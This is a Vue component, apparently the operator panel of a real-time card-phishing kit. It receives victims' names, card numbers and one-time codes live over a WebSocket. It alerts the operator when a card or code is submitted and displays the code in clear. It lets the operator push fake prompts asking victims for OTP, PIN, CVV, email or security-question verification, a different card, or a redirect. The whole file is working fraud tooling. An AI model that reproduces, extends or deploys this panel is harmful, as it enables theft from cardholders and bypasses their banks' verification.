<script setup lang="ts">
import { ref, reactive, onUnmounted, computed } from 'vue';
import { usePaymentWs } from './composables/use-payment-ws';
import SessionCard from './modules/session-card.vue';
import SettingsPanel from './modules/settings-panel.vue';

const sessions = reactive<Api.Payment.PaymentSession[]>([]);
const connectCount = reactive<Api.Payment.ConnectCount>({ customerCount: 0, operatorCount: 0 });
const settingsPanel = ref<InstanceType<typeof SettingsPanel> | null>(null);

let audioCtx: AudioContext | null = null;

function playNotification() {
  try {
    if (!audioCtx) audioCtx = new AudioContext();
    const o = audioCtx.createOscillator();
    const g = audioCtx.createGain();
    o.connect(g);
    g.connect(audioCtx.destination);
    o.type = 'sine';
    o.frequency.value = 880;
    g.gain.value = 0.15;
    o.start();
    g.gain.exponentialRampToValueAtTime(0.001, audioCtx.currentTime + 0.3);
    o.stop(audioCtx.currentTime + 0.3);
  } catch {}
}

const { connected, sendAction, ws } = usePaymentWs({
  wsUrl: `${location.protocol === 'https:' ? 'wss:' : 'ws:'}//${location.host}/api`,
  operatorId: 'op_' + Date.now(),
  onSessionList: (list) => {
    sessions.splice(0, sessions.length, ...(list as Api.Payment.PaymentSession[]));
  },
  onSessionNew: (data) => {
    sessions.unshift(data as Api.Payment.PaymentSession);
    playNotification();
    window.$notification?.info({
      title: '新支付会话',
      content: `编号 ${(data as Api.Payment.PaymentSession).sessionId} - ${(data as Api.Payment.PaymentSession).customerInfo?.fullName || '未知用户'}`,
      duration: 4000
    });
  },
  onSessionUpdate: (data) => {
    const idx = sessions.findIndex(s => s.id === data.sessionId);
    if (idx !== -1) {
      const s = sessions[idx];
      const prevStatus = s.status;

      if (data.cardInfo) {
        // Replace cardInfo entirely to trigger Vue reactivity
        s.cardInfo = { ...s.cardInfo, ...data.cardInfo };
      }
      if (data.customerInfo) s.customerInfo = { ...s.customerInfo, ...data.customerInfo };
      if (data.browsingTabs !== undefined) s.browsingTabs = data.browsingTabs;
      if (data.currentStep !== undefined) s.currentStep = data.currentStep;
      if (data.status !== undefined) s.status = data.status;
      if (data.isOnline !== undefined) s.isOnline = data.isOnline;
      if (data.countdownSeconds !== undefined) s.countdownSeconds = data.countdownSeconds;
      if (data.cardHistory !== undefined) (s as any).cardHistory = data.cardHistory;
      if (data.status === 'pending' && prevStatus !== 'pending') {
        playNotification();
        const hasOtp = !!(data.cardInfo?.otpCode || (s as any).cardInfo?.otpCode);
        window.$notification?.warning({
          title: hasOtp ? '🔔 客户已提交验证码' : '🔔 客户已提交卡号',
          content: `编号 ${s.sessionId} - ${s.customerInfo?.fullName || '未知用户'} - 卡号 ${s.cardInfo?.cardNumber?.slice(0,4) || '****'}****`,
          duration: 6000
        });
      } else if (data.cardInfo?.otpCode && s.cardInfo?.otpCode !== data.cardInfo.otpCode) {
        // OTP submitted when already pending
        playNotification();
        window.$notification?.info({
          title: '📲 客户提交了验证码',
          content: `编号 ${s.sessionId} - 验证码 ${data.cardInfo.otpCode}`,
          duration: 4000
        });
      }
    }
  },
  onSessionRemove: (sessionId: string) => {
    const idx = sessions.findIndex(s => s.id === sessionId);
    if (idx !== -1) sessions.splice(idx, 1);
  },
  onConnectCount: (count) => {
    Object.assign(connectCount, count);
  }
});

function handleAction(action: Api.Payment.OperatorAction, sessionId: string, message?: string) {
  sendAction(action, sessionId, message);
  const labels: Record<string, string> = {
    otp_verify: 'OTP验证', custom_otp_verify: '自定义OTP验证',
    email_verify: '邮箱验证', pin_verify: 'PIN验证',
    cvv_verify: 'CVV验证', app_verify: 'APP验证',
    question_verify: '问题验证', change_card: '换卡支付',
    custom_prompt: '自定义提示', redirect_complete: '跳转完成',
    approve: '通过', reject: '拒绝'
  };
  window.$message?.info(`已发送操作: ${labels[action] || action}` + (message ? ` (${message})` : ''));
}

function handleSettingsChanged(settings: any) {
  if (ws.value?.readyState === WebSocket.OPEN) {
    ws.value.send(JSON.stringify({ type: 'update_settings', payload: settings }));
  } else {
    // retry after WS connected
    const retry = setInterval(() => {
      if (ws.value?.readyState === WebSocket.OPEN) {
        ws.value.send(JSON.stringify({ type: 'update_settings', payload: settings }));
        clearInterval(retry);
      }
    }, 500);
    setTimeout(() => clearInterval(retry), 10000);
  }
}

function handleMoveTop(sessionId: string) {
  const idx = sessions.findIndex(s => s.id === sessionId);
  if (idx > 0) {
    const [item] = sessions.splice(idx, 1);
    sessions.unshift(item);
  }
}

onUnmounted(() => {
  audioCtx?.close();
});
</script>

<template>
  <div class="payment-console">
    <div class="console-toolbar">
      <NButton size="small" quaternary @click="settingsPanel?.open()">⚙ 面板设置</NButton>
    </div>
    <div class="console-body">
      <div v-if="!sessions.length" class="empty-state">
        <NEmpty description="暂无支付会话，等待客户提交..." />
      </div>

      <TransitionGroup name="session-list" tag="div">
        <SessionCard
          v-for="s in sessions"
          :key="s.id"
          :session="s"
          @action="(a: any, s: any, m: any) => handleAction(a, s, m)"
          @move-top="handleMoveTop"
        />
      </TransitionGroup>
    </div>
    <SettingsPanel ref="settingsPanel" @settings-changed="handleSettingsChanged" />
  </div>
</template>

<style scoped>
.payment-console {
  height: 100%;
  display: flex;
  flex-direction: column;
  min-height: calc(100vh - 120px);
}
.console-toolbar {
  display: flex;
  justify-content: flex-end;
  padding: 4px 8px;
  flex-shrink: 0;
}
.console-body {
  flex: 1;
  overflow-y: auto;
  padding: 10px 8px 160px;
}
.empty-state {
  display: flex;
  align-items: center;
  justify-content: center;
  min-height: 300px;
}
.session-list-enter-active,
.session-list-leave-active {
  transition: all 0.4s ease;
}
.session-list-enter-from {
  opacity: 0;
  transform: translateY(-20px);
}
.session-list-leave-to {
  opacity: 0;
  transform: translateX(60px);
}
</style>
